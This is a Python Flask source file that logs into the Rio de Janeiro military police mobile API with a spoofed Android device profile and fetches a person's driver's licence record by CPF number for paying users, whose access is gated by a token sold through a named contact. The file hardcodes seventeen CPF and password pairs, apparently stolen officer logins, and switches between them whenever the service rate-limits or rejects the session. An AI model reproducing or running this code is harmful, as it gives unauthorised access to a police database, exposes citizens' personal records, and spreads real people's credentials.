import requests
import json
import random
from colorama import Fore
from auth.validacao import validacao
from flask import jsonify, make_response



def GetStr(texto, inicio, fim):
    try:
        return texto.split(inicio)[1].split(fim)[0]
    except Exception:
        return "S/N"


def logar(cpf, senha):
    headers = {
        'Host': 'api-app-portal.pmerj.seg.br',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-N976N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
        'X-Requested-With': 'oprj.pmerj.rj.gov.br',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    json_data = {
        'user': {
            'NR_Cpf': cpf,
            'Senha': senha,
            'device': {
                'cordova': '11.0.0',
                'model': 'SM-N976N',
                'platform': 'Android',
                'uuid': '63152d56cd04d4d3',
                'version': '7.1.2',
                'manufacturer': 'samsung',
                'isVirtual': False,
                'serial': 'd56cd04d4d363152',
            },
            'lat': 0,
            'lng': 0,
        },
        'lat': 0,
        'lng': 0,
        'device': {
            'cordova': '11.0.0',
            'model': 'SM-N976N',
            'platform': 'Android',
            'uuid': '63152d56cd04d4d3',
            'version': '7.1.2',
            'manufacturer': 'samsung',
            'isVirtual': False,
            'serial': 'd56cd04d4d363152',
        },
        'id_onesignal': None,
    }

    response = requests.post('http://api-app-portal.pmerj.seg.br/system_api/authentication/authMobile', headers=headers, json=json_data).text

    token = GetStr(response, 'token":"', '"')

    if 'token":"' in response:
        with open("./token.txt", 'w') as f:
            f.write(token)
    else:
        print(Fore.CYAN + f"[+] {cpf}:{senha} [ {response} ]")


def pegar_token():
    with open("token.txt", "r", encoding='utf-8') as f:
        token = f.read().strip()
    return token


def consulta_cpf_cnh(cpf, token):
    auth = validacao(token)
    if auth != 1:
        return jsonify({'mensagem': 'Token inválido, chame @klzinnn para adquirir'})

    token_login = pegar_token()

    headers = {
        'Host': 'portal.pmerj.rj.gov.br',
        'authorization': 'Bearer ' + token_login,
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-N976N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
        'content-type': 'application/json',
        'x-requested-with': 'oprj.pmerj.rj.gov.br',
    }

    response = requests.get('http://portal.pmerj.rj.gov.br/apisoi/pessoas/getRenachByCPF/' + cpf, headers=headers).text

    print(response)
    if any(keyword in response for keyword in ['invalid algorithm', 'Unexpected token', 'Too many requests, please try again later']):
        print(Fore.RED + f'[+] {cpf} RELOGANDO')
        dados = {
            '08979075740': '212223',
            '05500223763': '194913',
            '10591445735': 'luiza2010',
            '04567332725': 'ventu89',
            '02966593717': '481707',
            '07626194730': 'servir',
            '10031435718': '004243',
            '07421857702': 'sau05492',
            '09292964780': '171299',
            '03046659750': '180871',
            '07299437716': 'br1956',
            '09671977758': 'rj81213pmerj',
            '02899026739': '3sargent',
            '01917934777': 'ags72840',
            '01443955760': 'p4t7z152',
            '08916122708': 'tandera1',
            '08387315702': 'snipes75'
        }

        cpf_aleatorio = random.choice(list(dados.keys()))
        senha_correspondente = dados[cpf_aleatorio]

        logar(cpf_aleatorio, senha_correspondente)


        return jsonify({'erro': 'Retestar o servidor nao testou'})
    elif 'numeroFormularioCnh' in response:
        response_data = json.loads(response)
        response_json = jsonify({'dados': response_data})
        response = make_response(response_json)
        response.headers['Content-Type'] = 'application/json'
        return response
    else:
        return jsonify({'erro': 'esse cpf nao possui cnh'})
